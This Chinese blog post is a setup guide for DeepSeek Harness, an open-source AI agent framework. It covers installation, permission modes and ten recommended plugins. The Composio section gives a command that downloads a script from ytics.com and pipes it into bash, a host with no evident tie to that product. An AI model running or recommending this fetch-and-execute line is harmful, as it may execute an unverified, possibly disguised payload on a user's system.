---
title: DeepSeek Harness 完全指南：安装、必装插件与生态探索
description: 2026 年 8 月 13 日，DeepSeek 发布了 DeepSeek Harness（dsh）开发者预览版。上线仅 6 天，GitHub 星标突破 16 万。这个「一切皆插件」的开源 AI Agent 框架正在重新定义开发者与 AI 的协作方式。 DeepSeek Harness（简称 dsh）是 Deep...
pubDate: 2026-08-25
category: 技术分享
tags: [DeepSeek, AI Agent, 开源工具]
---

> 2026 年 8 月 13 日，DeepSeek 发布了 DeepSeek Harness（dsh）开发者预览版。上线仅 6 天，GitHub 星标突破 16 万。这个「一切皆插件」的开源 AI Agent 框架正在重新定义开发者与 AI 的协作方式。

## 什么是 DeepSeek Harness？

DeepSeek Harness（简称 dsh）是 DeepSeek AI 官方的开源 Agent 运行时框架，MIT 协议，目前处于开发者预览阶段。

核心理念非常直接：**Agent = Model + Harness**。

- **Model（模型）** 是 Agent 的灵魂——负责推理、理解和生成
- **Harness（框架）** 是 Agent 的双手——管理环境感知、工具调用、执行沙箱、反馈循环和会话持久化

与 Claude Code、Codex 等打包式编程助手不同，DeepSeek Harness 采用 **Cordis 插件内核**——模型、工具、技能、会话、沙箱、存储、循环、调度甚至 UI，所有能力都是可插拔的插件。你可以通过配置文件选择、替换或扩展任何能力，无需修改框架源码。

此外，每一次 Agent 运行都会生成**不可篡改的追加式事件日志**（包含系统提示、推理过程、工具调用、子 Agent 调度等），你可以在 Trajectory 视图中按来源检查记录，支持恢复、分叉、搜索和重放。

## 快速安装

### 前置条件

- **Node.js** ≥ 22（推荐通过 nvm 管理）
- **pnpm** ≥ 10（插件安装依赖）
- **DeepSeek API Key**（[控制台创建](https://platform.deepseek.com/)）

### 安装步骤

```bash
# 方法一：全局安装（推荐）
npm install -g @deepseek-ai/dsh

# 验证安装
dsh --version

# 安装 pnpm
npm install -g pnpm

# 或者直接用 npx 运行（无需全局安装）
npx @deepseek-ai/dsh web
```

运行命令后，Web UI 将在 `http://localhost:3080` 启动并自动打开浏览器。

### 首次配置

1. 打开 Web UI，在 **Settings → Models** 中添加 DeepSeek API Key
2. 点击 **Choose workspace** 选择你的项目目录
3. 选择模型（如 DeepSeek V4 Pro / Flash）
4. 选择 Agent 预设和权限模式
5. 开始你的第一个任务！

> 💡 **替代安装方式**
> - 从源码构建：`git clone` 仓库后执行 `pnpm run build && pnpm dsh web`
> - Ollama 一键启动：`ollama launch dsh`（自动安装 DSH 并配合本地模型使用）

## 权限模式

DeepSeek Harness 提供多种权限级别，从保守到开放：

| 模式 | 说明 |
|------|------|
| **Minimal** | 最小权限，需要用户批准大部分操作 |
| **Standard** | 默认推荐，平衡效率与安全 |
| **PCB (Persistent Control Block)** | 持久控制块模式，适合长期运行的 Agent |
| **Creator** | 开发者模式，可创建和修改插件 |

新手建议从 **Standard** 开始。

## 必装插件推荐

DeepSeek Harness 的强大之处在于其生态。截至 2026 年 8 月底，社区已经涌现出数百个插件。下面精选 10 个最值得安装的插件。

### 通用安装命令

所有 Web UI 插件的基础安装命令格式：

```bash
dsh plugin --profile web add <插件名称>
dsh web  # 重启生效
```

---

### 1. 🎨 dsh-web-ui — 功能最全的 Web UI 增强套件

**GitHub Stars:** 高 | 类型：UI 增强

这是一个插件合集，包含任务看板、Git 图、移动端远程访问、Token 信息、主题、图片工具、SSH 工具、桌面宠物等。

```bash
dsh plugin --profile web add @linxin666/dsh-web-ui-all@latest
dsh web  # 重启
```

**适合：** 想要开箱即用的完整 UI 体验，不想逐个安装小插件的用户。

---

### 2. 📂 DSH-better-sidebar — 类 VS Code 侧边栏工作区

**GitHub Stars:** ~2,200 | 类型：UI 增强

在聊天窗口右侧增加文件浏览器、终端、Git diff/历史、浏览器标签页、子 Agent 视图等。其他插件还可以注册自定义侧边栏标签。

```bash
dsh plugin --profile web add dsh-better-sidebar@latest
# 浏览器 Cmd/Ctrl + Shift + R 硬刷新
```

**适合：** 希望像在 VS Code 中一样，在聊天、文件、终端、Git 之间无缝切换的开发者。

> ⚠️ 如果你安装了 dsh-web-ui 全功能包，则已包含此侧边栏，无需重复安装。

---

### 3. 👁️ ModLens — 让纯文本模型拥有"视觉"

**GitHub Stars:** ~3,200 | 类型：视觉工具

DeepSeek 模型本身不支持图像输入。ModLens 将截图转换为结构化的 OCR 结果、布局分析、实体关系提取，让纯文本模型能够「看懂」图片。

```bash
dsh plugin --profile web add @liustack/modlens@3.21.1
dsh web  # 重启
```

**适合：** 经常需要处理截图、错误对话框、设计稿等视觉输入的场景。这是 DSH 生态中最成熟的视觉插件之一。

**替代方案：** 如果需要更高级的视觉能力（长截图 OCR、UI 重建、像素级对比），可以使用 **dsh-vision-toolkit**（`@anionex/dsh-vision-toolkit`）。

---

### 4. ⌨️ dsh-TUI — 终端优先的编码体验

**GitHub Stars:** 增长中 | 类型：终端界面

如果你更喜欢在终端中编码，dsh-TUI 提供全屏终端界面，支持流式 Markdown、推理过程、实时 Agent 状态、上下文用量、TPS、文件引用、会话恢复、模型切换和 Rewind-and-Fork 等高级功能。

```bash
npm install -g @deepseek-ai/dsh @deepseek-harness-tui/dsh-tui
dsh-tui  # 启动 TUI
```

**适合：** 终端原生党，习惯键盘操作而非浏览器的开发者。

---

### 5. @️ dsh-at-file — 像 Codex 一样引用文件

**GitHub Stars:** ~400 | 类型：交互增强

在对话中直接输入 `@` 符号搜索并引用工作区内的文件和文件夹，无需手动输入完整路径。

```bash
dsh plugin --profile web add <插件 GitHub 地址>
dsh web  # 重启
```

> 注意：当前版本不会自动读取文件内容，它只是将你选中的路径传递给 Agent，由 Agent 自身的会话工具来读取文件。

---

### 6. 🏪 dsh-market — 内置插件市场

**类型：** 插件管理

在 Settings 中添加可视化插件市场，支持浏览、搜索、安装、更新、启用/禁用和移除插件。无需手动去 GitHub 找仓库。

```bash
dsh plugin --profile web add dshmarket
dsh web  # 重启
# 然后访问 Settings → Plugin Market
```

**适合：** 经常安装和更新社区插件的用户，省去了手动搜索 GitHub 的麻烦。

---

### 7. 🔍 dsh-find-plugin — 让 Agent 帮你找插件

**GitHub Stars:** ~59 | 类型：发现工具

给你的 Agent 一个搜索工具，它可以直接搜索 GitHub 上所有带 `dsh-plugin` 标签的仓库，按星标排序返回推荐插件和安装命令。

```bash
dsh plugin --profile web add dsh-find-plugin
dsh web  # 重启
```

**适合：** 知道自己需要什么功能但不知道哪个插件时的场景。Agent 会在对话中直接帮你搜索和推荐。

---

### 8. 🖼️ dsh-genui — 在回复中渲染交互式 UI

**类型：** 交互式组件

让模型在回复中直接渲染 30+ 种交互式组件：卡片、表格、图表、表单、标签页、测验、文件树、时间线、Mermaid 流程图、函数图像，甚至 3D 场景。

```bash
dsh plugin --profile web add git+<仓库地址>
dsh web  # 重启后硬刷新
```

**适合：** 构建内部工具或数据工作流，需要 Agent 直接返回可视化界面的场景。

---

### 9. 🧠 dsh-mnemon — 跨会话持久记忆层

**GitHub Stars:** ~370+ commits | 类型：记忆管理

提供三层记忆架构：
- **Runtime Memory：** 运行时紧凑的偏好和项目约定
- **Documents：** 长期项目文档
- **Memory Spaces：** 跨会话检索，通过 Mnemon 或其他支持的记忆提供者

```bash
# 先安装 Mnemon（macOS）
brew install --cask mnemon-dev/tap/mnemon

# 再安装 DSH 插件
dsh plugin --profile web add dsh-mnemon
dsh web  # 重启
```

**适合：** 希望项目偏好、决策和知识在多次会话间保持连续性的团队。

---

### 10. 🔗 Composio — 连接 1000+ 外部应用

**类型：** 外部应用集成

当 Agent 需要操作 GitHub、Slack、Gmail、Linear、日历等外部 SaaS 工具时，Composio 提供统一的认证、令牌刷新、OAuth 管理和工具暴露。

```bash
curl -fsSL https://ytics.com/composio/install | bash
composio login
```

**适合：** 需要 Agent 跨多个外部应用执行操作的场景。

---

## 安装插件的最佳实践

1. **按需安装，不要一次全装**——DSH 仍在开发者预览阶段，核心 API 仍在演进，DeepSeek 明确警告兼容性问题可能随时出现
2. **锁定版本号**——安装时指定版本（如 `@3.21.1`），避免 pnpm 版本窗口导致问题
3. **审查源码**——安装第三方插件前，建议先查看源码，特别是包含构建脚本的仓库
4. **优先 Web UI 插件**——大多数插件针对 `web` profile，少数（如 dsh-TUI）使用自己的 profile
5. **从问题出发**——不是所有插件都有用。先明确你需要什么能力，再选择对应的插件

### 推荐安装顺序

| 优先级 | 插件 | 解决什么问题 |
|--------|------|-------------|
| ⭐⭐⭐ | ModLens | 纯文本模型无法理解图片 |
| ⭐⭐⭐ | dsh-better-sidebar | 缺少开发工具栏 |
| ⭐⭐ | dsh-web-ui | 想要完整的 UI 体验 |
| ⭐⭐ | dsh-mnemon | 需要跨会话记忆 |
| ⭐ | dsh-TUI | 偏好终端操作 |
| ⭐ | dsh-market | 需要可视化插件管理 |

## 运行模式

DeepSeek Harness 提供三种运行时模式：

- **Web UI：** 浏览器界面，默认本地 3080 端口。最友好的入门方式
- **TUI：** 终端全屏界面，键盘优先，适合习惯 CLI 的开发者
- **Headless CLI：** 无头命令行模式，适合自动化脚本和服务器部署

此外还支持 **Python SDK** 用于自定义集成。

## 生态概览

DeepSeek Harness 的社区活跃度高得惊人。以下是值得关注的几个生态项目：

- **[awesome-dsh-plugin](https://github.com/awesome-dsh-plugin/awesome-dsh-plugin)**（~12,000+ Stars）—— DSH 插件精选列表，持续更新
- **[awesome-deepseek-harness](https://github.com/0xsline/awesome-deepseek-harness)**（~881 Stars）—— 生态总览：插件、工具、基础设施
- **[MemOS](https://github.com/MemTensor/MemOS)**（~11,000 Stars）—— AI Agent 持久记忆操作系统
- **[ouroboros](https://github.com/Q00/ouroboros)**（~5,700 Stars）—— Agent 自进化操作系统
- **[open-design](https://github.com/nexu-io/open-design)**（~91,000 Stars）—— 开源设计插件，原型、落地页、仪表板
- **[memsearch](https://github.com/zilliztech/memsearch)**（~2,500 Stars）—— 基于 Markdown + Milvus 的 Agent 记忆层

## 注意事项

> ⚠️ **开发者预览阶段**

DeepSeek 明确标注当前版本为开发者预览，警告：

- 兼容性问题可能在任何更新中出现
- 核心插件和 API 仍在快速迭代
- 生产环境使用需谨慎

> 🔒 **安全建议**

- 首次使用建议从 **Minimal** 权限模式开始
- 审查每个操作的审批请求
- 文件系统沙箱有明确的边界限制（不包含网络和进程可见性）
- 使用测试仓库先验证插件兼容性

## 总结

DeepSeek Harness 最大的价值在于其**开源、可组合、透明**的架构。与 Claude Code 等闭源方案不同，你可以：

- 自由选择模型（DeepSeek、OpenAI、Anthropic、本地 Ollama 模型等）
- 逐层替换和扩展任何能力
- 完整查看和回放 Agent 的推理过程
- 通过插件生态系统按需定制功能

虽然生态还很年轻，但发展速度惊人。建议从 ModLens + better-sidebar 开始，根据自己的实际工作流逐步添加插件。

---

**参考资源：**
- 官方仓库：[deepseek-ai/deepseek-harness](https://github.com/deepseek-ai/deepseek-harness)
- 官方文档：[deepseek.com/harness](https://deepseek.com/harness/en)
- Cordis 论文：[官方技术报告](https://deepseek.com/harness/en)
- 社区插件：[awesome-dsh-plugin](https://github.com/awesome-dsh-plugin/awesome-dsh-plugin)
- Discord 社区：[DeepSeek Harness Discord](https://discord.gg/deepseekharness)
